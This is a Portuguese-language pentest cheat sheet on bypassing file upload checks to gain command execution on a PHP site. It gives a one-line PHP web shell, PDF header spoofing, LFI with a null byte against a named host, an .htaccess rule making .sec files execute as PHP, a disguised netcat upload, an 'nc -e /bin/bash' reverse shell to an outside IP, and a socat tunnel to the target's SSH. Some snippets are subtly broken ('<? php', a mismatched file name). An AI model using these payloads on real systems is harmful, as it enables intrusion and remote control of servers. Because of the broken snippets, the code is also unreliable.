# Bypass File Upload

Crie um arquivo shell.php:
```php
<?php system($_GET['cmd']); ?>
```

Envie em algum formulário o arquivo malicioso.
Caso o arquivo seja barrado na extensão, tente alterar a extensão do arquivo e teste novamente.

Caso a aplicação faça a verificação via cabeçalho do arquivo será necessário efetuar algumas alterações no arquivo PHP.

Código de verificação de arquivo simples:
```php
<? php
echo mime_content_type('arquivo.php') . "\n";
?>
```
```bash
php arquivo.php
```

Verificando o header do arquivo:
head -n1 arquivo.pdf
Output: %PDF-1.3

Alterando header da shell.php:
```php
%PDF-1.3
<? php
echo mime_content_type('arquivo.php') . "\n";
?>
```

Tente subir o código maliciosa para a aplicação novamente e use o LFI/RFI:
rh.businesscorp.com.br/index.php?page=uploads/shell.pdf%00&cmd=uname -a

Em alguns casos o código enviado para o site não é interpretado como PHP e ao acessar aparece o seu conteúdo e não executa.
Nesse caso devemos criar um arquivo .htaccess:
```pcre
AddType application/x-httpd-php .sec
```
*Acima estamos falando que arquivos com extensão **.sec** devem ser interpretadas como PHP.*

Faça o upload do arquivo .htaccess para a aplicação e tente executar novamente o seu command execution.

## Fazendo Upload do NC

Criando arquivo nc com bypass:
echo "%PDF-1.3" > header.pdf
cat header /bin/nc > nc.pdf

Envie o arquivo via formulário vulnerável.

Utilizando o NC:
rh.businesscorp.com.br/index.php?page=uploads/shell.pdf%00&cmd=tail -n +2 uploads/nc.pdf > nc
rh.businesscorp.com.br/index.php?page=uploads/shell.pdf%00&cmd=chmod 777 nc
rh.businesscorp.com.br/index.php?page=uploads/shell.pdf%00&cmd=nc 192.168.0.101 443 -e /bin/bash

## Utilizando SOCAT

O SOCAT é utilizado para efetuar o tunelamento de portas filtradas.

#### Uso no servidor:
socat TCP4:NOSSOIP:8443 TCP4:127.0.0.1:22

#### Uso local:
socat TCP4-LISTEN:8443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr

#### Acessando o tunelamento:
ssh root@127.0.0.1 -p 2222

Ou seja, o caminho está sendo feito da seguinte forma:
127.0.0.1:2222 ==> 127.0.0.1:8443 <==> 192.168.0.100:8443 ==> 192.168.0.100:22
**Onde o IP 192.168.0.100 é o alvo.**

